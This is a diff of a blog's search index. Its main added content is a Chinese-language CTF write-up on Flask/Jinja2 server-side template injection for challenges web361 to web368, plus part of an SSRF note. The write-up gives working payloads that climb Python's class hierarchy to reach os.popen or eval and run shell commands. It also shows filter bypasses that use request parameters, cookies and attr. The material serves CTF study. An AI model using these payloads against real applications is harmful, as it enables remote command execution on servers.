@@ -1,69 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>SSTI</title>
-    <url>/2025/03/06/SSTI/</url>
-    <content><![CDATA[<p>ssti服务器端模板注入介绍<a href="https://xz.aliyun.com/news/3311?time__1311=eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken=71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig=1a0c399d17412599679115146e00dd">https://xz.aliyun.com/news/3311?time__1311=eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken=71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig=1a0c399d17412599679115146e00dd</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></figure>
-<p>过滤器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">int()：将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()：字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)：截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()：将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()：返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()：返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1>web361</h1>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti</p>
-<ul>
-<li><code>__class__</code></li>
-</ul>
-<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class 'str'&gt;</code>。</p>
-<ul>
-<li><code>__bases__</code></li>
-</ul>
-<p>以元组的形式返回一个类所直接继承的类。</p>
-<ul>
-<li><code>__base__</code></li>
-</ul>
-<p>以字符串返回一个类所直接继承的类。</p>
-<ul>
-<li><code>__mro__</code></li>
-</ul>
-<p>返回解析方法调用的顺序。</p>
-<ul>
-<li><code>__subclasses__()</code></li>
-</ul>
-<p>获取类的所有子类。</p>
-<ul>
-<li><code>__init__</code></li>
-</ul>
-<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
-<ul>
-<li><code>__globals__</code></li>
-</ul>
-<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
-<p><img src="image-20250306204920105.png" alt="image-20250306204920105"></p>
-<p>使用os._wrap_close</p>
-<p><strong>通过 <code>class</code> 跳转到类</strong></p>
-<p><code>class</code> -&gt; <code>mro</code> -&gt; <code>subclasses</code> -&gt; <code>init</code> -&gt; <code>globals</code>是一种常见的利用链</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
-<p><code>__class__</code>，攻击者可以从一个已知的对象（如空字符串 <code>&quot;&quot;</code> 或数字 <code>0</code>）跳转到它的类，进而利用类的属性和方法（如 <code>__mro__</code>、<code>__subclasses__</code> 等）来进一步探索和利用。</p>
-<p><strong>通过 <code>mro</code> 获取继承链</strong>    	 <strong>跳转到 <code>object</code> 类</strong></p>
-<p>通过 <code>__mro__</code>，攻击者可以访问 <code>object</code> 类，然后通过 <code>__subclasses__</code> 获取所有已加载的子类。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()  # 返回 object 的所有子类</span><br></pre></td></tr></table></figure>
-<p><code>__subclasses__</code> 的作用是让攻击者能够遍历所有已加载的类，寻找可以利用的类（如包含危险函数的类）。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：</span><br><span class="line">&quot;&quot;.__class__.__mro__[1]  # 返回 &lt;class &#x27;object&#x27;&gt;</span><br><span class="line">&quot;&quot;.__class__.__mro__[0]  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
-<p><code>__subclasses__</code> 的作用是让攻击者能够遍历所有已加载的类，寻找可以利用的类（如包含危险函数的类）。</p>
-<p>通过 <code>__subclasses__</code>，攻击者可以找到一个可以利用的子类，然后通过 <code>__init__</code> 访问该类的初始化方法。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__  # 返回某个子类的 __init__ 方法</span><br></pre></td></tr></table></figure>
-<p><code>__init__</code> 的作用是让攻击者能够访问类的构造函数，从而进一步访问 <code>__globals__</code>。</p>
-<p><code>__init__</code>在调用某函数前会被使用，所以使用<code>__init__</code>是为了给global做铺垫</p>
-<p>通过 <code>__init__</code>，攻击者可以访问 <code>__globals__</code>，即函数的全局命名空间。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__  # 返回全局命名空间</span><br></pre></td></tr></table></figure>
-<p><code>__globals__</code> 的作用是让攻击者能够访问模块的全局变量，包括导入的模块（如 <code>os</code>、<code>subprocess</code> 等），从而实现任意代码执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 从对象跳转到类</span><br><span class="line">&quot;&quot;.__class__  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 2. 通过 mro 获取继承链</span><br><span class="line">&quot;&quot;.__class__.__mro__  # 返回 (&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line"># 3. 跳转到 object 类</span><br><span class="line">&quot;&quot;.__class__.__mro__[1]  # 返回 &lt;class &#x27;object&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 4. 获取所有子类</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()  # 返回 object 的所有子类</span><br><span class="line"></span><br><span class="line"># 5. 寻找可利用的类（如包含 os 模块的类）X需要具体找</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X]</span><br><span class="line"></span><br><span class="line"># 6. 通过子类执行任意代码</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].system(&#x27;id&#x27;)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>phpCVE</title>
     <url>/2025/03/05/phpCVE/</url>
     <content><![CDATA[<h1>web311</h1>
@@ -124,6 +61,98 @@
 ]]></content>
       <tags>
         <tag>phpCVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI</title>
+    <url>/2025/03/06/SSTI/</url>
+    <content><![CDATA[<p>ssti服务器端模板注入介绍<a href="https://xz.aliyun.com/news/3311?time__1311=eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken=71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig=1a0c399d17412599679115146e00dd">https://xz.aliyun.com/news/3311?time__1311=eqUh0KGIwDCD%2FD0l3ExiKi%3DGC9vuKr4pD&amp;u_atoken=71799fd2f019f2db2e6695815a1e8fe8&amp;u_asig=1a0c399d17412599679115146e00dd</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p>过滤器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">int()：将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()：字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)：截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()：将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()：返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()：返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1>web361</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti</p>
+<ul>
+<li><code>__class__</code></li>
+</ul>
+<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class 'str'&gt;</code>。</p>
+<ul>
+<li><code>__bases__</code></li>
+</ul>
+<p>以元组的形式返回一个类所直接继承的类。</p>
+<ul>
+<li><code>__base__</code></li>
+</ul>
+<p>以字符串返回一个类所直接继承的类。</p>
+<ul>
+<li><code>__mro__</code></li>
+</ul>
+<p>返回解析方法调用的顺序。</p>
+<ul>
+<li><code>__subclasses__()</code></li>
+</ul>
+<p>获取类的所有子类。</p>
+<ul>
+<li><code>__init__</code></li>
+</ul>
+<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
+<ul>
+<li><code>__globals__</code></li>
+</ul>
+<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
+<p><img src="image-20250306204920105.png" alt="image-20250306204920105"></p>
+<p>使用os._wrap_close</p>
+<p><strong>通过 <code>class</code> 跳转到类</strong></p>
+<p><code>class</code> -&gt; <code>mro</code> -&gt; <code>subclasses</code> -&gt; <code>init</code> -&gt; <code>globals</code>是一种常见的利用链</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p><code>__class__</code>，攻击者可以从一个已知的对象（如空字符串 <code>&quot;&quot;</code> 或数字 <code>0</code>）跳转到它的类，进而利用类的属性和方法（如 <code>__mro__</code>、<code>__subclasses__</code> 等）来进一步探索和利用。</p>
+<p><strong>通过 <code>mro</code> 获取继承链</strong>    	 <strong>跳转到 <code>object</code> 类</strong></p>
+<p>通过 <code>__mro__</code>，攻击者可以访问 <code>object</code> 类，然后通过 <code>__subclasses__</code> 获取所有已加载的子类。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()  # 返回 object 的所有子类</span><br></pre></td></tr></table></figure>
+<p><code>__subclasses__</code> 的作用是让攻击者能够遍历所有已加载的类，寻找可以利用的类（如包含危险函数的类）。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：</span><br><span class="line">&quot;&quot;.__class__.__mro__[1]  # 返回 &lt;class &#x27;object&#x27;&gt;</span><br><span class="line">&quot;&quot;.__class__.__mro__[0]  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p><code>__subclasses__</code> 的作用是让攻击者能够遍历所有已加载的类，寻找可以利用的类（如包含危险函数的类）。</p>
+<p>通过 <code>__subclasses__</code>，攻击者可以找到一个可以利用的子类，然后通过 <code>__init__</code> 访问该类的初始化方法。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__  # 返回某个子类的 __init__ 方法</span><br></pre></td></tr></table></figure>
+<p><code>__init__</code> 的作用是让攻击者能够访问类的构造函数，从而进一步访问 <code>__globals__</code>。</p>
+<p><code>__init__</code>在调用某函数前会被使用，所以使用<code>__init__</code>是为了给global做铺垫</p>
+<p>通过 <code>__init__</code>，攻击者可以访问 <code>__globals__</code>，即函数的全局命名空间。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__  # 返回全局命名空间</span><br></pre></td></tr></table></figure>
+<p><code>__globals__</code> 的作用是让攻击者能够访问模块的全局变量，包括导入的模块（如 <code>os</code>、<code>subprocess</code> 等），从而实现任意代码执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 从对象跳转到类</span><br><span class="line">&quot;&quot;.__class__  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 2. 通过 mro 获取继承链</span><br><span class="line">&quot;&quot;.__class__.__mro__  # 返回 (&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line"># 3. 跳转到 object 类</span><br><span class="line">&quot;&quot;.__class__.__mro__[1]  # 返回 &lt;class &#x27;object&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 4. 获取所有子类</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()  # 返回 object 的所有子类</span><br><span class="line"></span><br><span class="line"># 5. 寻找可利用的类（如包含 os 模块的类）X需要具体找</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X]</span><br><span class="line"></span><br><span class="line"># 6. 通过子类执行任意代码</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].system(&#x27;id&#x27;)</span><br></pre></td></tr></table></figure>
+<p>下面这条链接有具体的原理解释，并且有推荐视频在链接的最下方</p>
+<p><a href="https://blog.csdn.net/qq_61955196/article/details/132237648">https://blog.csdn.net/qq_61955196/article/details/132237648</a></p>
+<h1>web362</h1>
+<p>过滤了某些东西</p>
+<p>好像是过滤了某些数字，从120到某些数字，但是这里的过滤有bug</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[400-50-50-50-50-50-18].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>就可以了</p>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;[].__class__.__base__.__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>builtins介绍：<a href="https://www.cnblogs.com/Ladylittleleaf/p/10240096.html">https://www.cnblogs.com/Ladylittleleaf/p/10240096.html</a></p>
+<h1>web363</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了’'和&quot;&quot;</p>
+<p>用request来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=popen&amp;b=cat /flag&amp;name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1>web364</h1>
+<p>利用cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;x.__init__.__globals__.__builtins__.eval(request.cookies.a)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.a)&#125;&#125;</span><br><span class="line"></span><br><span class="line">Cookie: a=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure>
+<h1>web365</h1>
+<p>过滤了中括号</p>
+<p>同364</p>
+<h1>web366</h1>
+<p>flask过滤器<a href="https://blog.csdn.net/xujin0/article/details/96101004">https://blog.csdn.net/xujin0/article/details/96101004</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">Cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure>
+<h1>web367</h1>
+<p>在366的基础上又ban了os</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=b=os&amp;name=&#123;&#123;(lipsum|attr(request.cookies.a)).get(request.values.b).popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">Cookie:a=__globals__;b=cat /flag</span><br><span class="line">或者全换了</span><br><span class="line">?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1>web368</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤了&#123;&#123;&#125;&#125;通过&#123;%%&#125;绕过，&#123;%%&#125;是执行函数用的，需要套用print</span><br><span class="line">?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -946,57 +975,6 @@ f1=sha1&amp;f2=getcwd                    因为/var/www/html md5后开头的数�
       </tags>
   </entry>
   <entry>
-    <title>ssrf</title>
-    <url>/2025/03/05/ssrf/</url>
-    <content><![CDATA[<h1>ssrf漏洞介绍</h1>
-<p>我们可以通过外网连到服务器。服务器可以访问内部网络。</p>
-<p>我们可以通过外网以服务器为媒介访问内部网络。</p>
-<p><code>parse_url()</code> 是 PHP 中的一个内置函数，用于解析一个 URL 并将其分解为各个组成部分，例如协议（scheme）、主机名（host）、端口（port）、路径（path）、查询字符串（query）和锚点（fragment）等。</p>
-<h1>parse_url()</h1>
-<p><img src="image-20250304195640159.png" alt="image-20250304195640159"></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">						 <span class="title function_ invoke__">parse_url</span>()  </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//</span><br><span class="line">    [user] =&gt; username			@前</span><br><span class="line">    [pass] =&gt; password			@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br><span class="line">	/path</span><br></pre></td></tr></table></figure>
